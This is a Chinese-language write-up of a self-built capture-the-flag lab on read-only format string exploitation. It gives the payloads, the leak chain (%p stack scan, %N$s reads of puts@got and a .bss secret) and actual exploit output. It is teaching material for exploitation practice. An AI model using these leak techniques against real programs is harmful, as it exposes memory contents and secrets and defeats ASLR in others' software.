# lab_fmtstr_read —— 自造格式化字符串“读”靶场（L8）

> **这是自造实验，不是真实赛题。** 目的：把**只读**的格式化字符串利用做完整
> —— 没有任何 `%n`，只靠 `%p` 扫栈和 `%s` 任意读，把程序**从不打印**的 flag
> 从 `.bss` 里读出来。

---

## 1. 题目行为

```text
协议：先 4 字节小端长度 len，再发 len 字节内容（二进制安全，地址里的 0x0a 不会被行读截断）
程序：printf("echo: "); printf(buf); printf("\n---\n");     ← 唯一的漏洞
```

- `flag.txt` 在启动时被读进 `secret[]`（`.bss`），程序**从不打印**它；
- 循环读入直到 EOF，所以可以反复试探、反复泄漏；
- `buf` 是 `main` 的**栈**缓冲区，`__attribute__((aligned(16)))`（16 字节对齐，
  方便把目标地址放在 `buf[0x10]` 而不必处理错位）。

保护（`checksec`，本机 gcc 15 + `-fno-pie -no-pie`）：

| 项 | 值 |
| --- | --- |
| 架构 | amd64，动态链接，glibc **2.43** |
| PIE | 无（基址 `0x400000`） |
| canary | 有（`-fstack-protector-strong`，本题没有栈溢出，canary 只是 `%p` 扫描的素材） |
| NX | 开启 |
| RELRO | Partial |

关键符号（`exp.py` 一律用 `ELF().symbols` 取）：

```text
secret     0x404080   .bss，flag 落点（不打印）
puts@got   0x404000   Partial RELRO → GOT 可读（本题只读，不改）
printf@got 0x404018
```

## 2. 为什么是“只读”fmtstr

| 目标 | 需要的原语 | 本 lab |
| --- | --- | --- |
| 读栈（canary / libc 返回地址） | `%p` / `%lx` | ✅ |
| 精确泄漏 GOT / libc 基址 | 定位 `%N$` 索引 + `%s` | ✅ |
| 读任意地址内容 | `%s` + 地址落在参数表可见位置 | ✅（读 `secret[]` 拿 flag） |
| 改 GOT / 劫持控制流 | `%n` 系列（`%hhn`/`%hn`/`%ln`）+ 字节计数 | ❌ 本题故意不给 |

好处：终点明确（“读到了 flag”），且**不依赖 libc 版本**做写入，任何机器上都能复现。

## 3. 利用链

```text
1) 探测 buf 索引
   say("MARKMARK" + ".%p"*0x30)
   → 找到输出里 0x4b52414d4b52414d（"MARKMARK" 小端）所在的第 k 个 %p
   → 实测本机 k = 8（printf 的前 5 个可变参在 rsi/rdx/rcx/r8/r9，第 6 个起才在栈上）

2) 扫栈认指针
   canary：低字节 0x00、高位非 0；
   libc/ld：0x7000_0000_0000 ~ 0x7f00_0000_0000（本机实测 0x71c9_22c2_a601 ≈ __libc_start_main 返回址）；
   栈：0x7f.. 段。

3) %s 读 puts@got
   payload = "%{k+2}$s".ljust(0x10, "\x00") + p64(puts@got)
   → 输出 6 字节 libc 指针（高 2 字节为 0）→ libc base = 泄漏 - puts 偏移（页对齐校验）

4) %s 读 secret[]
   payload = "%{k+2}$s".ljust(0x10, "\x00") + p64(secret)
   → 输出 __PWNED__{fmt_read_ok}   ← flag 到手
```

**为什么 `k+2`**：目标地址放在 `buf[0x10]`，而 `buf` 起始是第 `k` 个参数、
参数按 8 字节走，所以 `buf[0x10]` 是第 `k+2` 个参数。

## 4. 坑点（本次实测踩到的）

1. **缓冲区写成 `static` 就废了**：第一版为了对齐写成 `static char buf[0x100]`，
   直接跑 `%p` 扫栈扫不到 `MARKMARK`（buffer 跑到 `.bss`，不在栈参数区）。
   必须是**局部变量** + `__attribute__((aligned(16)))`。
2. **目标地址不能放在格式串前面**：`p64(0x404080)` 里必然有 `0x00`，
   `printf(buf)` 当 C 字符串处理，会在 `0x00` 处截断，后面的 `%s` 根本不执行。
   正确做法：`%{k}$s` 放前面，**地址放后面**（`%s` 先执行、输出完才遇到 `0x00`）。
3. **不能假设 libc 在 `0x7f..` 段**：本机 ASLR 把 libc 放到 `0x71c9_22c8_e860`
   （`0x7d/0x71` 都见过），所以判定要按“页对齐 + 减去本机 libc 的 `puts` 偏移”来做，
   而不是硬编码 `0x7f` 前缀。
4. **输出里可能混进 `0x0a`**：`%s` 读 GOT 得到的是二进制指针，含 `\n` 的概率约 2%。
   程序用固定的 `"\n---\n"` 做分隔符，EXP 用 `recvuntil` 收，二进制安全。
5. **行读协议会被地址里的 `\n` 截断**：所以协议用 `u32 长度 + 定长 payload`，
   不用 `fgets`/`readline`。
6. **`%p` 输出里会出现我们自己的输入**（`0x4b52...`、`0x252e7025...`），
   按十六进制过滤时要接受“这些不是指针”，别拿它们当泄漏值。

## 5. 复现

```bash
cd '/home/yfhd5/Pwn_Writeups/labs/lab_fmtstr_read'
source ../../.venv/bin/activate
make
printf '__PWNED__{fmt_read_ok}\n' > flag.txt
python exp.py                          # 期望输出 __PWNED__{fmt_read_ok}
# 远程：socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./chal 后
#       HOST=127.0.0.1 PORT=9999 python exp.py
```

实测输出（本机 glibc 2.43）：

```text
[+] buf 在 printf 参数表里的索引 k = 8
[*] libc/ld 指针候选 = 0x71c922c2a601
[+] puts@got 泄漏 = 0x71c922c8e860
[+] libc base = 0x71c922c00000（puts off = 0x8e860）
[+] secret[] 内容 = b'__PWNED__{fmt_read_ok}\n'
[+] fmtstr read OK
```

文件：`chal`（`make` 产物）+ `exp.py` + `src/chal.c` + `Makefile`。

## 6. 识别卡

```text
程序把用户输入直接当格式串（printf(buf) / syslog(buf) / fprintf(log, buf)）
  -> 先问：只要读还是要写？
     只要读：%p 扫栈定位 canary / libc，%N$s 读 GOT 与任意地址（本 lab）
     要写：  %hhn 逐字节写 GOT，需要算好已输出字节数（下一步的 fmtstr_write lab）
定位自己的缓冲区：发 “AAAA.%p.%p...” 找 0x4141414141414141 的索引 k
注意：地址必须放在格式串**后面**，否则 p64 里的 0x00 会截断格式串
```

> 与真实题的关系：`pwnable.tw` / BUUCTF 的 fmtstr 题基本都从“泄漏 canary + libc”
> 开始，本 lab 就是那一步的最小闭环（不写内存，避免跟着 libc 版本改 payload）。
